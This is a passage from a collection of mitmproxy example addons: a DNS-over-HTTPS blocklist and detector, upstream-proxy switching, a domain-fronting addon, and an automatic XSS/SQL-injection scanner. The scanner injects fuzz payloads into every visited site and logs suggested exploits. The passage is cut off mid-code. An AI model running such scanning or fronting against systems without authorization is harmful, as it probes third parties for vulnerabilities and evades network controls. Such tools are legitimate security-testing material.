\"doh.northeu.pi-dns.com\",\n        \"doh.westus.pi-dns.com\",\n        \"doh.eastus.pi-dns.com\",\n        \"dns.flatuslifir.is\",\n        \"private.canadianshield.cira.ca\",\n        \"protected.canadianshield.cira.ca\",\n        \"family.canadianshield.cira.ca\",\n        \"dns.google.com\",\n        \"dns.google.com\",\n    ],\n    \"ips\": [\n        \"104.16.248.249\",\n        \"104.16.248.249\",\n        \"104.16.249.249\",\n        \"104.16.249.249\",\n        \"104.18.2.55\",\n        \"104.18.26.128\",\n        \"104.18.27.128\",\n        \"104.18.3.55\",\n        \"104.18.44.204\",\n        \"104.18.44.204\",\n        \"104.18.45.204\",\n        \"104.18.45.204\",\n        \"104.182.57.196\",\n        \"104.236.178.232\",\n        \"104.24.122.53\",\n        \"104.24.123.53\",\n        \"104.28.0.106\",\n        \"104.28.1.106\",\n        \"104.31.90.138\",\n        \"104.31.91.138\",\n        \"115.159.131.230\",\n        \"116.202.176.26\",\n        \"116.203.115.192\",\n        \"136.144.215.158\",\n        \"139.59.48.222\",\n        \"139.99.222.72\",\n        \"146.112.41.2\",\n        \"146.112.41.3\",\n        \"146.185.167.43\",\n        \"149.112.112.10\",\n        \"149.112.112.11\",\n        \"149.112.112.112\",\n        \"149.112.112.9\",\n        \"149.112.121.10\",\n        \"149.112.121.20\",\n        \"149.112.121.30\",\n        \"149.112.122.10\",\n        \"149.112.122.20\",\n        \"149.112.122.30\",\n        \"159.69.198.101\",\n        \"168.235.81.167\",\n        \"172.104.93.80\",\n        \"172.65.3.223\",\n        \"174.138.29.175\",\n        \"174.68.248.77\",\n        \"176.103.130.130\",\n        \"176.103.130.131\",\n        \"176.103.130.132\",\n        \"176.103.130.134\",\n        \"176.56.236.175\",\n        \"178.62.214.105\",\n        \"185.134.196.54\",\n        \"185.134.197.54\",\n        \"185.213.26.187\",\n        \"185.216.27.142\",\n        \"185.228.168.10\",\n        \"185.228.168.168\",\n        \"185.235.81.1\",\n        \"185.26.126.37\",\n        \"185.26.126.37\",\n        \"185.43.135.1\",\n        \"185.95.218.42\",\n        \"185.95.218.43\",\n        \"195.30.94.28\",\n        \"2001:148f:fffe::1\",\n        \"2001:19f0:7001:3259:5400:2ff:fe71:bc9\",\n        \"2001:19f0:7001:5554:5400:2ff:fe57:3077\",\n        \"2001:19f0:7001:5554:5400:2ff:fe57:3077\",\n        \"2001:19f0:7001:5554:5400:2ff:fe57:3077\",\n        \"2001:4860:4860::8844\",\n        \"2001:4860:4860::8888\",\n        \"2001:4b98:dc2:43:216:3eff:fe86:1d28\",\n        \"2001:558:fe21:6b:96:113:151:149\",\n        \"2001:608:a01::3\",\n        \"2001:678:888:69:c45d:2738:c3f2:1878\",\n        \"2001:8b0::2022\",\n        \"2001:8b0::2023\",\n        \"2001:c50:ffff:1:101:101:101:101\",\n        \"210.17.9.228\",\n        \"217.169.20.22\",\n        \"217.169.20.23\",\n        \"2400:6180:0:d0::5f73:4001\",\n        \"2400:8902::f03c:91ff:feda:c514\",\n        \"2604:180:f3::42\",\n        \"2604:a880:1:20::51:f001\",\n        \"2606:4700::6810:f8f9\",\n        \"2606:4700::6810:f9f9\",\n        \"2606:4700::6812:1a80\",\n        \"2606:4700::6812:1b80\",\n        \"2606:4700::6812:237\",\n        \"2606:4700::6812:337\",\n        \"2606:4700:3033::6812:2ccc\",\n        \"2606:4700:3033::6812:2dcc\",\n        \"2606:4700:3033::6818:7b35\",\n        \"2606:4700:3034::681c:16a\",\n        \"2606:4700:3035::6818:7a35\",\n        \"2606:4700:3035::681f:5a8a\",\n        \"2606:4700:3036::681c:6a\",\n        \"2606:4700:3036::681f:5b8a\",\n        \"2606:4700:60:0:a71e:6467:cef8:2a56\",\n        \"2620:10a:80bb::10\",\n        \"2620:10a:80bb::20\",\n        \"2620:10a:80bb::30\" \"2620:10a:80bc::10\",\n        \"2620:10a:80bc::20\",\n        \"2620:10a:80bc::30\",\n        \"2620:119:fc::2\",\n        \"2620:119:fc::3\",\n        \"2620:fe::10\",\n        \"2620:fe::11\",\n        \"2620:fe::9\",\n        \"2620:fe::fe:10\",\n        \"2620:fe::fe:11\",\n        \"2620:fe::fe:9\",\n        \"2620:fe::fe\",\n        \"2a00:5a60::ad1:ff\",\n        \"2a00:5a60::ad2:ff\",\n        \"2a00:5a60::bad1:ff\",\n        \"2a00:5a60::bad2:ff\",\n        \"2a00:d880:5:bf0::7c93\",\n        \"2a01:4f8:1c0c:8233::1\",\n        \"2a01:4f8:1c1c:6b4b::1\",\n        \"2a01:4f8:c2c:52bf::1\",\n        \"2a01:4f9:c010:43ce::1\",\n        \"2a01:4f9:c01f:4::abcd\",\n        \"2a01:7c8:d002:1ef:5054:ff:fe40:3703\",\n        \"2a01:9e00::54\",\n        \"2a01:9e00::55\",\n        \"2a01:9e01::54\",\n        \"2a01:9e01::55\",\n        \"2a02:1205:34d5:5070:b26e:bfff:fe1d:e19b\",\n        \"2a03:4000:38:53c::2\",\n        \"2a03:b0c0:0:1010::e9a:3001\",\n        \"2a04:bdc7:100:70::abcd\",\n        \"2a05:fc84::42\",\n        \"2a05:fc84::43\",\n        \"2a07:a8c0::\",\n        \"2a0d:4d00:81::1\",\n        \"2a0d:5600:33:3::abcd\",\n        \"35.198.2.76\",\n        \"35.231.247.227\",\n        \"45.32.55.94\",\n        \"45.67.219.208\",\n        \"45.76.113.31\",\n        \"45.77.180.10\",\n        \"45.90.28.0\",\n        \"46.101.66.244\",\n        \"46.227.200.54\",\n        \"46.227.200.55\",\n        \"46.239.223.80\",\n        \"8.8.4.4\",\n        \"8.8.8.8\",\n        \"83.77.85.7\",\n        \"88.198.91.187\",\n        \"9.9.9.10\",\n        \"9.9.9.11\",\n        \"9.9.9.9\",\n        \"94.130.106.88\",\n        \"95.216.181.228\",\n        \"95.216.212.177\",\n        \"96.113.151.148\",\n    ],\n}\n\n# additional hostnames to block\nadditional_doh_names: list[str] = [\"dns.google.com\"]\n\n# additional IPs to block\nadditional_doh_ips: list[str] = []\n\ndoh_hostnames, doh_ips = default_blocklist[\"hostnames\"], default_blocklist[\"ips\"]\n\n# convert to sets for faster lookups\ndoh_hostnames = set(doh_hostnames)\ndoh_ips = set(doh_ips)\n\n\ndef _has_dns_message_content_type(flow):\n    \"\"\"\n    Check if HTTP request has a DNS-looking 'Content-Type' header\n\n    :param flow: mitmproxy flow\n    :return: True if 'Content-Type' header is DNS-looking, False otherwise\n    \"\"\"\n    doh_content_types = [\"application/dns-message\"]\n    if \"Content-Type\" in flow.request.headers:\n        if flow.request.headers[\"Content-Type\"] in doh_content_types:\n            return True\n    return False\n\n\ndef _request_has_dns_query_string(flow):\n    \"\"\"\n    Check if the query string of a request contains the parameter 'dns'\n\n    :param flow: mitmproxy flow\n    :return: True is 'dns' is a parameter in the query string, False otherwise\n    \"\"\"\n    return \"dns\" in flow.request.query\n\n\ndef _request_is_dns_json(flow):\n    \"\"\"\n    Check if the request looks like DoH with JSON.\n\n    The only known implementations of DoH with JSON are Cloudflare and Google.\n\n    For more info, see:\n    - https://developers.cloudflare.com/1.1.1.1/dns-over-https/json-format/\n    - https://developers.google.com/speed/public-dns/docs/doh/json\n\n    :param flow: mitmproxy flow\n    :return: True is request looks like DNS JSON, False otherwise\n    \"\"\"\n    # Header 'Accept: application/dns-json' is required in Cloudflare's DoH JSON API\n    # or they return a 400 HTTP response code\n    if \"Accept\" in flow.request.headers:\n        if flow.request.headers[\"Accept\"] == \"application/dns-json\":\n            return True\n    # Google's DoH JSON API is https://dns.google/resolve\n    path = flow.request.path.split(\"?\")[0]\n    if flow.request.host == \"dns.google\" and path == \"/resolve\":\n        return True\n    return False\n\n\ndef _request_has_doh_looking_path(flow):\n    \"\"\"\n    Check if the path looks like it's DoH.\n    Most common one is '/dns-query', likely because that's what's in the RFC\n\n    :param flow: mitmproxy flow\n    :return: True if path looks like it's DoH, otherwise False\n    \"\"\"\n    doh_paths = [\n        \"/dns-query\",  # used in example in RFC 8484 (see https://tools.ietf.org/html/rfc8484#section-4.1.1)\n    ]\n    path = flow.request.path.split(\"?\")[0]\n    return path in doh_paths\n\n\ndef _requested_hostname_is_in_doh_blocklist(flow):\n    \"\"\"\n    Check if server hostname is in our DoH provider blocklist.\n\n    The current blocklist is taken from https://github.com/curl/curl/wiki/DNS-over-HTTPS.\n\n    :param flow: mitmproxy flow\n    :return: True if server's hostname is in DoH blocklist, otherwise False\n    \"\"\"\n    hostname = flow.request.host\n    ip = flow.server_conn.address\n    return hostname in doh_hostnames or hostname in doh_ips or ip in doh_ips\n\n\ndoh_request_detection_checks = [\n    _has_dns_message_content_type,\n    _request_has_dns_query_string,\n    _request_is_dns_json,\n    _requested_hostname_is_in_doh_blocklist,\n    _request_has_doh_looking_path,\n]\n\n\ndef request(flow):\n    for check in doh_request_detection_checks:\n        is_doh = check(flow)\n        if is_doh:\n            logging.warning(\n                '[DoH Detection] DNS over HTTPS request detected via method \"%s\"'\n                % check.__name__\n            )\n            flow.kill()\n            break\n", "examples/contrib/change_upstream_proxy.py": "from mitmproxy import http\nfrom mitmproxy.connection import Server\nfrom mitmproxy.net.server_spec import ServerSpec\n\n# This scripts demonstrates how mitmproxy can switch to a second/different upstream proxy\n# in upstream proxy mode.\n#\n# Usage: mitmdump\n#   -s change_upstream_proxy.py\n#   --mode upstream:http://default-upstream-proxy:8080/\n#   --set connection_strategy=lazy\n#   --set upstream_cert=false\n#\n# If you want to change the target server, you should modify flow.request.host and flow.request.port\n\n\ndef proxy_address(flow: http.HTTPFlow) -> tuple[str, int]:\n    # Poor man's loadbalancing: route every second domain through the alternative proxy.\n    if hash(flow.request.host) % 2 == 1:\n        return (\"localhost\", 8082)\n    else:\n        return (\"localhost\", 8081)\n\n\ndef request(flow: http.HTTPFlow) -> None:\n    address = proxy_address(flow)\n\n    is_proxy_change = address != flow.server_conn.via.address\n    server_connection_already_open = flow.server_conn.timestamp_start is not None\n    if is_proxy_change and server_connection_already_open:\n        # server_conn already refers to an existing connection (which cannot be modified),\n        # so we need to replace it with a new server connection object.\n        flow.server_conn = Server(address=flow.server_conn.address)\n    flow.server_conn.via = ServerSpec((\"http\", address))\n", "examples/contrib/suppress_error_responses.py": "\"\"\"\nThis script suppresses the 502 Bad Gateway messages, mitmproxy sends if the server is not responsing correctly.\nFor example, this functionality can be helpful if mitmproxy is used in between a web scanner and a web application.\nWithout this script, if the web application under test crashes, mitmproxy will send 502 Bad Gateway responses.\nThese responses are irritating the web application scanner since they obfuscate the actual problem.\n\"\"\"\n\nfrom mitmproxy import http\nfrom mitmproxy.exceptions import HttpSyntaxException\n\n\ndef error(self, flow: http.HTTPFlow):\n    \"\"\"Kills the flow if it has an error different to HTTPSyntaxException.\n    Sometimes, web scanners generate malformed HTTP syntax on purpose and we do not want to kill these requests.\n    \"\"\"\n    if flow.error is not None and not isinstance(flow.error, HttpSyntaxException):\n        flow.kill()\n", "examples/contrib/domain_fronting.py": "import json\nfrom dataclasses import dataclass\n\nfrom mitmproxy import ctx\nfrom mitmproxy.addonmanager import Loader\nfrom mitmproxy.http import HTTPFlow\n\n\"\"\"\nThis extension implements support for domain fronting.\n\nUsage:\n\n   mitmproxy -s examples/contrib/domain_fronting.py --set domainfrontingfile=./domain_fronting.json\n\nIn the following basic example, www.example.com will be used for DNS requests and SNI values\nbut the secret.example.com value will be used for the HTTP host header:\n\n    {\n        \"mappings\": [\n            {\n                \"patterns\": [\"secret.example.com\"],\n                \"server\": \"www.example.com\"\n            }\n        ]\n    }\n\nThe following example demonstrates the usage of a wildcard (at the beginning of the domain name only):\n\n    {\n        \"mappings\": [\n            {\n                \"patterns\": [\"*.foo.example.com\"],\n                \"server\": \"www.example.com\"\n            }\n        ]\n    }\n\nIn the following example, we override the HTTP host header:\n\n    {\n        \"mappings\": [\n            {\n                \"patterns\": [\"foo.example\"],\n                \"server\": \"www.example.com\",\n                \"host\": \"foo.proxy.example.com\"\n            }\n        ]\n    }\n\n\"\"\"\n\n\n@dataclass\nclass Mapping:\n    server: str | None\n    host: str | None\n\n\nclass HttpsDomainFronting:\n    # configurations for regular (\"foo.example.com\") mappings:\n    star_mappings: dict[str, Mapping]\n\n    # Configurations for star (\"*.example.com\") mappings:\n    strict_mappings: dict[str, Mapping]\n\n    def __init__(self) -> None:\n        self.strict_mappings = {}\n        self.star_mappings = {}\n\n    def _resolve_addresses(self, host: str) -> Mapping | None:\n        mapping = self.strict_mappings.get(host)\n        if mapping is not None:\n            return mapping\n\n        index = 0\n        while True:\n            index = host.find(\".\", index)\n            if index == -1:\n                break\n            super_domain = host[(index + 1) :]\n            mapping = self.star_mappings.get(super_domain)\n            if mapping is not None:\n                return mapping\n            index += 1\n\n        return None\n\n    def load(self, loader: Loader) -> None:\n        loader.add_option(\n            name=\"domainfrontingfile\",\n            typespec=str,\n            default=\"./fronting.json\",\n            help=\"Domain fronting configuration file\",\n        )\n\n    def _load_configuration_file(self, filename: str) -> None:\n        config = json.load(open(filename))\n        strict_mappings: dict[str, Mapping] = {}\n        star_mappings: dict[str, Mapping] = {}\n        for mapping in config[\"mappings\"]:\n            item = Mapping(server=mapping.get(\"server\"), host=mapping.get(\"host\"))\n            for pattern in mapping[\"patterns\"]:\n                if pattern.startswith(\"*.\"):\n                    star_mappings[pattern[2:]] = item\n                else:\n                    strict_mappings[pattern] = item\n        self.strict_mappings = strict_mappings\n        self.star_mappings = star_mappings\n\n    def configure(self, updated: set[str]) -> None:\n        if \"domainfrontingfile\" in updated:\n            domain_fronting_file = ctx.options.domainfrontingfile\n            self._load_configuration_file(domain_fronting_file)\n\n    def request(self, flow: HTTPFlow) -> None:\n        if not flow.request.scheme == \"https\":\n            return\n        # We use the host header to dispatch the request:\n        target = flow.request.host_header\n        if target is None:\n            return\n        mapping = self._resolve_addresses(target)\n        if mapping is not None:\n            flow.request.host = mapping.server or target\n            flow.request.headers[\"host\"] = mapping.host or target\n\n\naddons = [HttpsDomainFronting()]\n", "examples/contrib/custom_next_layer.py": "\"\"\"\nThis addon demonstrates how to override next_layer to modify the protocol in use.\nIn this example, we are forcing connections to example.com:443 to instead go as plaintext\nto example.com:80.\n\nExample usage:\n\n    - mitmdump -s custom_next_layer.py\n    - curl -x localhost:8080 -k https://example.com\n\"\"\"\n\nimport logging\n\nfrom mitmproxy import ctx\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy import layers\n\n\ndef running():\n    # We change the connection strategy to lazy so that next_layer happens before we actually connect upstream.\n    # Alternatively we could also change the server address in `server_connect`.\n    ctx.options.connection_strategy = \"lazy\"\n\n\ndef next_layer(nextlayer: layer.NextLayer):\n    logging.info(\n        f\"{nextlayer.context=}\\n\"\n        f\"{nextlayer.data_client()[:70]=}\\n\"\n        f\"{nextlayer.data_server()[:70]=}\\n\"\n    )\n\n    if nextlayer.context.server.address == (\"example.com\", 443):\n        nextlayer.context.server.address = (\"example.com\", 80)\n\n        # We are disabling ALPN negotiation as our curl client would otherwise agree on HTTP/2,\n        # which our example server here does not accept for plaintext connections.\n        nextlayer.context.client.alpn = b\"\"\n\n        # We know all layers that come next: First negotiate TLS with the client, then do simple TCP passthrough.\n        # Setting only one layer here would also work, in that case next_layer would be called again after TLS establishment.\n        nextlayer.layer = layers.ClientTLSLayer(nextlayer.context)\n        nextlayer.layer.child_layer = layers.TCPLayer(nextlayer.context)\n", "examples/contrib/all_markers.py": "from mitmproxy import command\nfrom mitmproxy import ctx\nfrom mitmproxy.utils import emoji\n\n\n@command.command(\"all.markers\")\ndef all_markers():\n    \"Create a new flow showing all marker values\"\n    for marker in emoji.emoji:\n        ctx.master.commands.call(\n            \"view.flows.create\", \"get\", f\"https://example.com/{marker}\"\n        )\n        ctx.master.commands.call(\"flow.mark\", [ctx.master.view[-1]], marker)\n", "examples/contrib/xss_scanner.py": "r\"\"\"\n\n __   __ _____ _____     _____\n \\ \\ / // ____/ ____|   / ____|\n  \\ V /| (___| (___    | (___   ___ __ _ _ __  _ __   ___ _ __\n   > <  \\___ \\\\___ \\    \\___ \\ / __/ _` | '_ \\| '_ \\ / _ \\ '__|\n  / . \\ ____) |___) |   ____) | (_| (_| | | | | | | |  __/ |\n /_/ \\_\\_____/_____/   |_____/ \\___\\__,_|_| |_|_| |_|\\___|_|\n\n\nThis script automatically scans all visited webpages for XSS and SQLi vulnerabilities.\n\nUsage: mitmproxy -s xss_scanner.py\n\nThis script scans for vulnerabilities by injecting a fuzzing payload (see PAYLOAD below) into 4 different places\nand examining the HTML to look for XSS and SQLi injection vulnerabilities. The XSS scanning functionality works by\nlooking to see whether it is possible to inject HTML based off of of where the payload appears in the page and what\ncharacters are escaped. In addition, it also looks for any script tags that load javascript from unclaimed domains.\nThe SQLi scanning functionality works by using regular expressions to look for errors from a number of different\ncommon databases. Since it is only looking for errors, it will not find blind SQLi vulnerabilities.\n\nThe 4 places it injects the payload into are:\n1. URLs         (e.g. https://example.com/ -> https://example.com/PAYLOAD/)\n2. Queries      (e.g. https://example.com/index.html?a=b -> https://example.com/index.html?a=PAYLOAD)\n3. Referers     (e.g. The referer changes from https://example.com to PAYLOAD)\n4. User Agents  (e.g. The UA changes from Chrome to PAYLOAD)\n\nReports from this script show up in the event log (viewable by pressing e) and formatted like:\n\n===== XSS Found ====\nXSS URL: http://daviddworken.com/vulnerableUA.php\nInjection Point: User Agent\nSuggested Exploit: <script>alert(0)</script>\nLine: 1029zxcs'd\"ao<ac>so[sb]po(pc)se;sl/bsl\\eq=3847asd\n\n\"\"\"\n\nimport logging\nimport re\nimport socket\nfrom html.parser import HTMLParser\nfrom typing import NamedTuple\nfrom typing import Optional\nfrom urllib.parse import urlparse\n\nimport requests\n\nfrom mitmproxy import http\n\n# The actual payload is put between a frontWall and a backWall to make it easy\n# to locate the payload with regular expressions\nFRONT_WALL = b\"1029zxc\"\nBACK_WALL = b\"3847asd\"\nPAYLOAD = b\"\"\"s'd\"ao<ac>so[sb]po(pc)se;sl/bsl\\\\eq=\"\"\"\nFULL_PAYLOAD = FRONT_WALL + PAYLOAD + BACK_WALL\n\n\n# A XSSData is a named tuple with the following fields:\n#   - url -> str\n#   - injection_point -> str\n#   - exploit -> str\n#   - line -> str\nclass XSSData(NamedTuple):\n    url: str\n    injection_point: str\n    exploit: str\n    line: str\n\n\n# A SQLiData is named tuple with the following fields:\n#   - url -> str\n#   - injection_point -> str\n#   - regex -> str\n#   - dbms -> str\nclass SQLiData(NamedTuple):\n    url: str\n    injection_point: str\n    regex: str\n    dbms: str\n\n\nVulnData = tuple[Optional[XSSData], Optional[SQLiData]]\nCookies = dict[str, str]\n\n\ndef get_cookies(flow: http.HTTPFlow) -> Cookies:\n    \"\"\"Return a dict going from cookie names to cookie values\n    - Note that it includes both the cookies sent in the original request and\n      the cookies sent by the server\"\"\"\n    return {name: value for name, value in flow.request.cookies.fields}\n\n\ndef find_unclaimed_URLs(body, requestUrl):\n    \"\"\"Look for unclaimed URLs in script tags and log them if found\"\"\"\n\n    def getValue(attrs: list[tuple[str, str]], attrName: str) -> str | None:\n        for name, value in attrs:\n            if attrName == name:\n                return value\n        return None\n\n    class ScriptURLExtractor(HTMLParser):\n        script_URLs: list[str] = []\n\n        def handle_starttag(self, tag, attrs):\n            if (tag == \"script\" or tag == \"iframe\") and \"src\" in [\n                name for name, value in attrs\n            ]:\n                self.script_URLs.append(getValue(attrs, \"src\"))\n            if (\n                tag == \"link\"\n                and getValue(attrs, \"rel\") == \"stylesheet\"\n                and \"href\" in [name for name, value in attrs]\n            ):\n                self.script_URLs.append(getValue(attrs, \"href\"))\n\n    parser = ScriptURLExtractor()\n    parser.feed(body)\n    for url in parser.script_URLs:\n        url_parser = urlparse(url)\n        domain = url_parser.netloc\n        try:\n            socket.gethostbyname(domain)\n        except socket.gaierror:\n            logging.error(f'XSS found in {requestUrl} due to unclaimed URL \"{url}\".')\n\n\ndef test_end_of_URL_injection(\n    original_body: str, request_URL: str, cookies: Cookies\n) -> VulnData:\n    \"\"\"Test the given URL for XSS via injection onto the end of the URL and\n    log the XSS if found\"\"\"\n    parsed_URL = urlparse(request_URL)\n    path = parsed_URL.path\n    if path != \"\" and path[-1] != \"/\":  # ensure the path ends in a /\n        path += \"/\"\n    path += FULL_PAYLOAD.decode(\n        \"utf-8\"\n    )  # the path must be a string while the payload is bytes\n    url = parsed_URL._replace(path=path).geturl()\n    body = requests.get(url, cookies=cookies).text.lower()\n    xss_info = get_XSS_data(body, url, \"End of URL\")\n    sqli_info = get_SQLi_data(body, original_body, url, \"End of URL\")\n    return xss_info, sqli_info\n\n\ndef test_referer_injection(\n    original_body: str, request_URL: str, cookies: Cookies\n) -> VulnData:\n    \"\"\"Test the given URL for XSS via injection into the referer and\n    log the XSS if found\"\"\"\n    body = requests.get(\n        request_URL, headers={\"referer\": FULL_PAYLOAD}, cookies=cookies\n    ).text.lower()\n    xss_info = get_XSS_data(body, request_URL, \"Referer\")\n    sqli_info = get_SQLi_data(body, original_body, request_URL, \"Referer\")\n    return xss_info, sqli_info\n\n\ndef test_user_agent_injection(\n    original_body: str, request_URL: str, cookies: Cookies\n) -> VulnData:\n    \"\"\"Test the given URL for XSS via injection into the user agent and\n    log the XSS if found\"\"\"\n    body = requests.get(\n        request_URL, headers={\"User-Agent\": FULL_PAYLOAD}, cookies=cookies\n    ).text.lower()\n    xss_info = get_XSS_data(body, request_URL, \"User Agent\")\n    sqli_info = get_SQLi_data(body, original_body, request_URL, \"User Agent\")\n    return xss_info, sqli_info\n\n\ndef test_query_injection(original_body: str, request_URL: str, cookies: Cookies):\n    \"\"\"Test the given URL for XSS via injection into URL queries and\n    log the XSS if found\"\"\"\n    parsed_URL = urlparse(request_URL)\n    query_string = parsed_URL.query\n    # queries is a list of parameters where each parameter is set to the payload\n    queries = [\n        query.split(\"=\")[0] + \"=\" + FULL_PAYLOAD.decode(\"utf-8\")\n        for query in query_string.split(\"&\")\n    ]\n    new_query_string = \"&\".join(queries)\n    new_URL = parsed_URL._replace(query=new_query_string).geturl()\n    body = requests.get(new_URL, cookies=cookies).text.lower()\n    xss_info = get_XSS_data(body, new_URL, \"Query\")\n    sqli_info = get_SQLi_data(body, original_body, new_URL, \"Query\")\n    return xss_info, sqli_info\n\n\ndef log_XSS_data(xss_info: XSSData | None) -> None:\n    \"\"\"Log information about the given XSS to mitmproxy\"\"\"\n    # If it is None, then there is no info to log\n    if not xss_info:\n        return\n    logging.error(\"===== XSS Found ====\")\n    logging.error(\"XSS URL: %s\" % xss_info.url)\n    logging.error(\"Injection Point: %s\" % xss_info.injection_point)\n    logging.error(\"Suggested Exploit: %s\" % xss_info.exploit)\n    logging.error(\"Line: %s\" % xss_info.line)\n\n\ndef log_SQLi_data(sqli_info: SQLiData | None) -> None:\n    \"\"\"Log information about the given SQLi to mitmproxy\"\"\"\n    if not sqli_info:\n        return\n    logging.error(\"===== SQLi Found =====\")\n    logging.error(\"SQLi URL: %s\" % sqli_info.url)\n    logging.error(\"Injection Point: %s\" % sqli_info.injection_point)\n    logging.error(\"Regex used: %s\" % sqli_info.regex)\n    logging.error(\"Suspected DBMS: %s\" % sqli_info.dbms)\n    return\n\n\ndef get_SQLi_data(\n    new_body: str, original_body: str, request_URL: str, injection_point: str\n) -> SQLiData | None:\n    \"\"\"Return a SQLiDict if there is a SQLi otherwise return None\n    String String URL String -> (SQLiDict or None)\"\"\"\n    # Regexes taken from Damn Small SQLi Scanner: https://github.com/stamparm/DSSS/blob/master/dsss.py#L17\n    DBMS_ERRORS = {\n        \"MySQL\": (\n            r\"SQL syntax.*MySQL\",\n            r\"Warning.*mysql_.*\",\n            r\"valid MySQL result\",\n            r\"MySqlClient\\.\",\n        ),\n        \"PostgreSQL\": (\n            r\"PostgreSQL.*ERROR\",\n            r\"Warning.*\\Wpg_.*\",\n            r\"valid PostgreSQL result\",\n            r\"Npgsql\\.\",\n        ),\n        \"Microsoft SQL Server\": (\n            r\"Driver.* SQL[\\-\\_\\ ]*Server\",\n            r\"OLE DB.* SQL Server\",\n            r\"(\\W|\\A)SQL Server.*Driver\",\n            r\"Warning.*mssql_.*\",\n            r\"(\\W|\\A)SQL Server.*[0-9a-fA-F]{8}\",\n            r\"(?s)Exception.*\\WSystem\\.Data\\.SqlClient\\.\",\n            r\"(?s)Exception.*\\WRoadhouse\\.Cms\\.\",\n        ),\n        \"Microsoft Access\": (\n            r\"Microsoft Access Driver\",\n            r\"JET Database Engine\",\n            r\"Access Database Engine\",\n        ),\n        \"Oracle\": (\n            r\"\\bORA-[0-9][0-9][0-9][0-9]\",\n            r\"Oracle error\",\n            r\"Oracle.*Driver\",\n            r\"Warning.*\\Woci_.*\",\n            r\"Warning.*\\Wora_.*\",\n        ),\n        \"IBM DB2\": (r\"CLI Driver.*DB2\", r\"DB2 SQL error\", r\"\\bdb2_\\w+\\(\"),\n        \"SQLite\": (\n            r\"SQLite/JDBCDriver\",\n            r\"SQLite.Exception\",\n            r\"System.Data.SQLite.SQLiteException\",\n            r\"Warning.*sqlite_.*\",\n            r\"Warning.*SQLite3::\",\n            r\"\\[SQLITE_ERROR\\]\",\n        ),\n        \"Sybase\": (\n            r\"(?i)Warning.*sybase.*\",\n            r\"Sybase message\",\n            r\"Sybase.*Server message.*\",\n        ),\n    }\n    for dbms, regexes in DBMS_ERRORS.items():\n        for regex in regexes:  # type: ignore\n            if re.search(regex, new_body, re.IGNORECASE) and not re.search(\n                regex, original_body, re.IGNORECASE\n            ):\n                return SQLiData(request_URL, injection_point, regex, dbms)\n    return None\n\n\n# A qc is either ' or \"\ndef inside_quote(\n    qc: str, substring_bytes: bytes, text_index: int, body_bytes: bytes\n) -> bool:\n    \"\"\"Whether the Numberth occurrence of the first string in the second\n    string is inside quotes as defined by the supplied QuoteChar\"\"\"\n    substring = substring_bytes.decode(\"utf-8\")\n    body = body_bytes.decode(\"utf-8\")\n    num_substrings_found = 0\n    in_quote = False\n    for index, char in enumerate(body):\n        # Whether the next chunk of len(substring) chars is the substring\n        next_part_is_substring = (not (index + len(substring) > len(body))) and (\n            body[index : index + len(substring)] == substring\n        )\n        # Whether this char is escaped with a \\\n        is_not_escaped = (index - 1 < 0 or index - 1 > len(body)) or (\n            body[index - 1] != \"\\\\\"\n        )\n        if char == qc and is_not_escaped:\n            in_quote = not in_quote\n        if next_part_is_substring:\n            if num_substrings_found == text_index:\n                return in_quote\n            num_substrings_found += 1\n    return False\n\n\ndef paths_to_text(html: str, string: str) -> list[str]:\n    \"\"\"Return list of Paths to a given str in the given HTML tree\n    - Note that it does a BFS\"\"\"\n\n    def remove_last_occurence_of_sub_string(string: str, substr: str) -> str:\n        \"\"\"Delete the last occurrence of substr from str\n        String String -> String\n        \"\"\"\n        index = string.rfind(substr)\n        return string[:index] + string[index + len(substr) :]\n\n    class PathHTMLParser(HTMLParser):\n        currentPath = \"\"\n        paths: list[str] = []\n\n        def handle_starttag(self, tag, attrs):\n            self.currentPath += \"/\" + tag\n\n        def handle_endtag(self, tag):\n            self.currentPath = remove_last_occurence_of_sub_string(\n                self.currentPath, \"/\" + tag\n            )\n\n        def handle_data(self, data):\n            if string in data:\n                self.paths.append(self.currentPath)\n\n    parser = PathHTMLParser()\n    parser.feed(html)\n    return parser.paths\n\n\ndef get_XSS_data(\n    body: str | bytes, request_URL: str, injection_point: str\n) -> XSSData | None:\n    \"\"\"Return a XSSDict if there is a XSS otherwise return None\"\"\"\n\n    def in_script(text, index, body) -> bool:\n        \"\"\"Whether the Numberth occurrence of the first string in the second\n        string is inside a script tag\"\"\"\n        paths = paths_to_text(body.decode(\"utf-8\"), text.decode(\"utf-8\"))\n        try:\n            path = paths[index]\n            return \"script\" in path\n        except IndexError:\n            return False\n\n    def in_HTML(text: bytes, index: int, body: bytes) -> bool:\n        \"\"\"Whether the Numberth occurrence of the first string in the second\n        string is inside the HTML but not inside a script tag or part of\n        a HTML attribute\"\"\"\n        # if there is a < then lxml will interpret that as a tag, so only search for the stuff before it\n        text = text.split(b\"<\")[0]\n        paths = paths_to_text(body.decode(\"utf-8\"), text.decode(\"utf-8\"))\n        try:\n            path = paths[index]\n            return \"script\" not in path\n        except IndexError:\n            return False\n\n    def inject_javascript_handler(html: str) -> bool:\n        \"\"\"Whether you can inject a Javascript:alert(0) as a link\"\"\"\n\n        class injectJSHandlerHTMLParser(HTMLParser):\n            injectJSHandler = False\n\n            def handle_starttag(self, tag, attrs):\n                for name, value in attrs:\n                    if name == \"href\" and value.startswith(FRONT_WALL.decode(\"utf-8\")):\n                        self.injectJSHandler = True\n\n        parser = injectJSHandlerHTMLParser()\n        parser.feed(html)\n        return parser.injectJSHandler\n\n    # Only convert the body to bytes if needed\n    if isinstance(body, str):\n        body = bytes(body, \"utf-8\")\n    # Regex for between 24 and 72 (aka 24*3) characters encapsulated by the walls\n    regex = re.compile(b\"\"\"%s.{24,72}?%s\"\"\" % (FRONT_WALL, BACK_WALL))\n    matches = regex.findall(body)\n    for index, match in enumerate(matches):\n        # Where the string is injected into the HTML\n        in_script_val = in_script(match, index, body)\n        in_HTML_val = in_HTML(match, index, body)\n        in_tag = not in_script_val and not in_HTML_val\n        in_single_quotes = inside_quote(\"'\", match, index, body)\n        in_double_quotes = inside_quote('\"', match, index, body)\n        # Whether you can inject:\n        inject_open_angle = b\"ao<ac\" in match  # open angle brackets\n        inject_close_angle = b\"ac>so\" in match  # close angle brackets\n        inject_single_quotes = b\"s'd\" in match  # single quotes\n        inject_double_quotes = b'd\"ao' in match  # double quotes\n        inject_slash = b\"sl/bsl\" in match  # forward slashes\n        inject_semi = b\"se;sl\" in match  # semicolons\n        inject_equals = b\"eq=\" in match  # equals sign\n        if (\n            in_script_val and inject_slash and inject_open_angle and inject_close_angle\n        ):  # e.g. 